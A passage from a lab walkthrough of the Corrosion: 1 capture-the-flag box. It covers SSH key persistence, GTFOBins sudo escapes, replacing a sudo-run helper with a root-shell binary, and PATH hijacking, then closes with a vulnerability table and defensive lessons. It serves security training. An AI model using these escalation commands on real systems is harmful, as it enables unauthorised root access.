> # or:  hashcat -m 22921 -a 0 key.hash rockyou.txt    (22931 for ed25519)
> ```
>
> **Writing your own key is the cleanest persistence there is:**
>
> ```bash
> ssh-keygen -t ed25519 -f labkey -N ''                # -N '' = no passphrase
> cat labkey.pub >> /home/user/.ssh/authorized_keys    # if you can write it
> chmod 600 /home/user/.ssh/authorized_keys            # ssh refuses loose permissions
> ssh -i labkey user@target
> ```
>
> Note the `chmod 600` — `sshd` **silently ignores** an `authorized_keys` with overly
> permissive modes, which makes "my key does not work" a permissions problem more
> often than a key problem.
>
> **Always try a found key against *every* user on *every* host** you know about. Key
> reuse across machines and accounts is extremely common.
>
> **Deep dive:** [CONCEPTS §9.9 — SSH](../../docs/CONCEPTS.md#99-ssh--port-22) ·
> [§16.2 — Harvesting credentials](../../docs/CONCEPTS.md#162-harvesting-credentials)

```text
id_rsa  id_rsa.pub  my_password.txt  easysysinfo.c
cat backup/my_password.txt
```

```text
randylovesgoldfish1998
```

> **Why it works:** the archive contained `randy`'s **private SSH key**
> (`id_rsa`) and a plaintext file with his **SSH password**. Either grants us the
> `randy` account.

Log in as `randy`:

```bash
ssh randy@192.168.56.101
# password: randylovesgoldfish1998
```

```text
randy@corrosion:~$ id
uid=1000(randy) gid=1000(randy) groups=1000(randy),4(adm),...
randy@corrosion:~$ cat /home/randy/user.txt 2>/dev/null || cat user.txt
FLAG: 98342721012390839081
```

> **Why it works:** we now own a normal user account and can read the user flag.
> The real prize, though, is what `randy` is allowed to do as **root**.

### 4.5 Check sudo rights


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
sudo -l
```

```text
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:...:/bin:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /home/randy/tools/easysysinfo
```

> **Why it works:** `sudo -l` lists the exact commands this user may run as root.
> `randy` may run **`/home/randy/tools/easysysinfo`** β€” a helper that lives in
> *randy's own home directory*.

### 4.6 Inspect the helper

```bash
cat /home/randy/tools/easysysinfo.c
ls -la /home/randy/tools/easysysinfo
```

```c
#include <unistd.h>
void main()
{
  setuid(0);
  setgid(0);
  system("/usr/bin/date");
  system("cat /etc/hosts");
  system("/usr/bin/uname -a");
}
```

```text
-rwsr-xr-x 1 root root ... easysysinfo   <-- SUID root, and root-owned
```

> **Why it works and why it's exploitable:** two problems combine.
> 1. The program calls `cat` **without an absolute path**. Normally sudo uses a
>    `secure_path`, but the binary is also **SUID root**, so when it runs, the
>    first matching `cat` on our `PATH` executes as root.
> 2. `sudoers` authorises the command by **path only**, not content. The file is
>    root-owned, but the **directory `/home/randy/tools/` is owned by randy**, so
>    randy can delete or replace the binary.

### 4.7 Exploit β€” overwrite the helper with our own binary

Because randy owns the directory, rename the original and drop in a program of
our own:

```bash
cd /home/randy/tools
mv easysysinfo easysysinfo.orig
```

Create a tiny C program that spawns a root shell:

```bash
cat > easysysinfo.c <<'EOF'
#include <unistd.h>
#include <stdlib.h>
int main(void)
{
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF
```

Compile it (the target has `gcc`), then run it through sudo:

```bash
gcc easysysinfo.c -o easysysinfo
sudo /home/randy/tools/easysysinfo
```

```text
root@corrosion:/home/randy/tools# id
uid=0(root) gid=0(root) groups=0(root)
root@corrosion:~# cat /root/root.txt
FLAG: 4NJSA99SD7922197D7S90PLAWE
```

> **Why it works:** `sudo` trusted the *path* `/home/randy/tools/easysysinfo`
> and ran whatever file was there as root. That file is now our compiled
> program, which calls `setuid(0)` and drops us into a root Bash. Game over.

**Alternative (PATH abuse) route.** Same weakness, different trigger: keep the
original SUID binary, but put a malicious `cat` earlier in `PATH`, then run the
original helper directly (no sudo needed for that part because the binary is SUID):


> ### 📖 Concept — PATH hijacking
>
> When a program runs another program **by name only** (`service`, `tar`, `python`)
> rather than by absolute path, the shell searches each directory in `$PATH` **left to
> right** and executes the first match it finds. If you can place a file earlier in
> that search order, you control what runs.
>
> This matters when the calling program is **root-owned** — a cron job, a SUID binary,
> or a startup script:
>
> ```bash
> mkdir -p /tmp/evil
> printf '#!/bin/sh\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\n' > /tmp/evil/service
> chmod +x /tmp/evil/service
> export PATH=/tmp/evil:$PATH
> # wait for the root job to run, then:
> /tmp/rootbash -p
> ```
>
> **Find the opportunity** by inspecting what the privileged program actually calls:
>
> ```bash
> strace -f -e trace=execve /usr/local/bin/script.sh 2>&1 | grep execve
> strings /usr/local/bin/script.sh | grep -E 'system\(|popen\(|exec'
> ```
>
> An `execve("service", ...)` with **no leading `/`** is the vulnerability. A fully
> qualified `/usr/sbin/service` is not.
>
> **Check cron's own PATH first** — `/etc/crontab` usually sets
> `PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`, and
> `sudo`'s `secure_path` overrides yours entirely. If `/tmp` cannot get into that
> list, look instead for a writable directory that is *already* in it —
> `/usr/local/bin` very often is.
>
> **Deep dive:** [CONCEPTS §15.8 — PATH hijacking](../../docs/CONCEPTS.md#158-path-hijacking)

```bash
echo 'chmod +s /bin/bash' > /home/randy/tools/cat
chmod +x /home/randy/tools/cat
export PATH=/home/randy/tools:$PATH
/home/randy/tools/easysysinfo
/bin/bash -p
```

> **Why it works:** the helper runs `system("cat /etc/hosts")`. With our fake
> `cat` first in `PATH`, that line runs *our* script as root, which makes
> `/bin/bash` SUID. Launching it with `-p` (preserve SUID privileges) yields a
> root shell. Both routes reach the same destination.

![Root shell captured](images/05-root-shell.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Location | Impact | Fix |
|---|---|---|---|---|
| 1 | **Directory listing enabled** | `/tasks/`, `/blog-post/archives/` | Leaks file names and the `tasks_todo.txt` roadmap | Disable `Options Indexes`; add `index.html` |
| 2 | **Local File Inclusion (LFI)** | `randylogs.php?file=` | Reads any file the web user can read | Never pass user input to `include()`; use an allow-list |
| 3 | **Log poisoning β†’ RCE** | Injected PHP in `/var/log/auth.log` | Remote command execution as `www-data` | Fix log permissions; do not include logs in PHP |
| 4 | **World-readable log file** | `/var/log/auth.log` (0775 via crontab) | Enables log poisoning after the LFI | Restrict logs to root (`0640`) |
| 5 | **World-readable backup archive** | `/var/backups/user_backup.zip` | Leaks SSH key + plaintext password | Store backups outside web/LAN perms; encrypt properly |
| 6 | **Weak ZIP password** | `user_backup.zip` (`!randybaby`) | Trivially cracked offline | Use strong passphrases / key-based secrets |
| 7 | **Sensitive files in backup** | `id_rsa`, `my_password.txt` | Direct account takeover of `randy` | Never back up private keys with their passphrases |
| 8 | **sudo helper replaceable by owner** | `/home/randy/tools/easysysinfo` | Full root compromise | Put admin binaries in root-owned dirs; validate content |
| 9 | **Relative-path `cat` in SUID program** | `system("cat /etc/hosts")` | PATH/SOID abuse β†’ root | Always use absolute paths in SUID/root helpers |

---

## 6. Defensive lessons (blue team)

- **Turn off directory listings.** A single `Indexes` option gave the attacker a
  to-do list describing the intended exploit chain.
- **Never build file inclusion from user input.** `include($_GET['file'])` is the
  root cause of both the file read and the RCE. Use an allow-list of known files
  or a fixed mapping from keys to paths.
- **Keep authentication logs root-only.** `auth.log` should be `0640 root:adm`.
  A cron job that *loosens* it to `0775` every minute is a self-inflicted
  vulnerability.
- **Do not let logs be interpreted as code.** Even if a log is readable, nothing
  should ever `include()` or `eval()` its contents.
- **Treat backups as secrets.** An off-LAN, encrypted backup with a strong
  passphrase, storing no private keys next to their own password file, avoids the
  entire second half of this attack.
- **Harden sudo helpers.** Place privileged helper binaries in root-owned
  directories that the calling user cannot write to, authorise by full content or
  a checksum, and never call other programs by a bare name inside an elevated
  program (use absolute paths, and drop SUID if sudo already elevates).
- **Least privilege for the web user.** `www-data` should not be able to reach
  meaningful data under `/home` or `/var/backups`.
- **Monitor for log injection.** Usernames containing `<?php` are a loud,
  detectable signal β€” alert on anomalous login-attempt strings.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub β€” Corrosion: 1 entry: https://vulnhub.com/entry/corrosion-1,730/
- Corrosion.ova download mirror: https://download.vulnhub.com/corrosion/Corrosion.ova
- NepCodeX walkthrough: https://nepcodex.com/2021/08/corrosion-walkthrough-vulnhub-writeup/
- GrumpyGeekWrites walkthrough: https://grumpygeekwrites.wordpress.com/2021/08/26/vulnhub-corrosion-walk-through-tutorial-writeup/
- Infosec Institute β€” Corrosion 1 walkthrough (part 1): https://www.infosecinstitute.com/resources/capture-the-flag/corrosion-1-vulnhub-ctf-walkthrough-part-one/
- ArtilleryRed (Medium) writeup: https://artilleryred.medium.com/vulnhub-writeup-of-corrosion-7a5859ce84d8
- Hackatua walkthrough: https://www.hackatua.com/walkthroughs/corrosion-1
- devl00p β€” alternative LFI-to-RCE (php filter chains): https://devl00p.github.io/posts/Solution-du-CTF-Corrosion-de-VulnHub/
- Enes Γ–zkΔ±rdeniz (Medium) walkthrough: https://medium.com/@ozkirdenizenes/corrosion-1-walkthrough-5ad3a1b0b418
- Ch15hu1 writeup (Chinese): https://www.cnblogs.com/vuln/p/17677565.html

---

## 8. Screenshot checklist

Capture these as you go so you can reproduce the writeup with images. Save them
in `images/` with the filenames used in this document.

- [ ] `images/01-arp-scan.png` β€” `arp-scan`/`netdiscover` showing `192.168.56.101`
- [ ] `images/02-gobuster.png` β€” gobuster discovering `/tasks` and `/blog-post`
- [ ] `images/03-lfi-passwd.png` β€” `/etc/passwd` read through `randylogs.php?file=`
- [ ] `images/04-reverse-shell.png` β€” `www-data` shell caught in `nc`
- [ ] `images/05-root-shell.png` β€” `id` showing `uid=0(root)` and `root.txt`
- [ ] `images/06-tasks-todo.png` β€” the `tasks_todo.txt` hint file
- [ ] `images/07-wfuzz-file.png` β€” `wfuzz`/`ffuf` discovering the `file` parameter
- [ ] `images/08-authlog-poison.png` β€” injected PHP payload visible in `auth.log`
- [ ] `images/09-zip2john.png` β€” `zip2john` + `john` cracking `!randybaby`
- [ ] `images/10-sudo-l.png` β€” `sudo -l` showing the `easysysinfo` helper

---

*Corrosion: 1 is an excellent first box: every step is a clue leading to the next,
and the "Enumeration is key" hint rewards patience. Try to solve each stage
yourself before reading ahead β€” the learning is in the enumeration.*
